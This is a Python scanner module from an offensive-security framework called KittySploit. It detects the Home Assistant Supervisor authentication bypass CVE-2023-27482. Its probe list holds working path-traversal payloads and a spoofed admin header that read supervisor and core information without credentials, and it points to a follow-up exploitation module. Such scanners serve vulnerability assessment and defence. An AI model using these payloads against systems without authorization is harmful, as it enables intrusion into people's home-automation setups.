#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Home Assistant Supervisor authentication bypass (CVE-2023-27482)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Home Assistant - Supervisor Auth Bypass Detection (CVE-2023-27482)',
        'description': (
            'Home Assistant supervised installs are vulnerable to authentication bypass via '
            'path traversal under /api/hassio/app/ and /api/hassio_ingress/ (CVE-2023-27482), '
            'exposing supervisor/core info without credentials.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2023', 'home-assistant', 'auth-bypass',
            'unauth', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'auxiliary/admin/http/home_assistant_cve_2023_27482_info',
                ],
            },
        },
        'references': [
            'https://github.com/elttam/publications/blob/master/writeups/home-assistant/supervisor-authentication-bypass-advisory.md',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-27482',
        ],
        'cve': 'CVE-2023-27482',
    }

    base_path = OptString('', 'Optional Home Assistant base path prefix', required=False)

    def _prefix(self) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return ''
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/')

    def run(self):
        prefix = self._prefix()
        entry = self.http_request(
            method='GET',
            path=f'{prefix}/api/hassio/app/entrypoint.js',
            allow_redirects=False,
        )
        if not entry or entry.status_code != 200:
            return False

        probes = (
            (f'{prefix}/api/hassio/app/.%252e/core/info', None),
            (f'{prefix}/api/hassio/app/.%252e/supervisor/info', None),
            (f'{prefix}/api/hassio/app/.%09./supervisor/info', None),
            (f'{prefix}/api/hassio_ingress/.%09./core/info', {'X-Hass-Is-Admin': '1'}),
            (f'{prefix}/api/hassio_ingress/.%09./supervisor/info', {'X-Hass-Is-Admin': '1'}),
        )
        for path, headers in probes:
            r = self.http_request(
                method='GET',
                path=path,
                headers=headers,
                allow_redirects=False,
            )
            if not r or r.status_code != 200:
                continue
            body = r.text or ''
            # Require hassio-shaped JSON, not any {"result":"ok"} API.
            if (
                '"result"' in body
                and '"ok"' in body
                and ('"data"' in body)
                and any(
                    k in body
                    for k in (
                        '"hassos"',
                        '"supervisor"',
                        '"homeassistant"',
                        '"channel"',
                        '"arch"',
                        '"version_latest"',
                    )
                )
            ):
                self.set_info(
                    severity='critical',
                    reason='Home Assistant CVE-2023-27482 supervisor auth bypass',
                    path=path,
                )
                return True
        return False
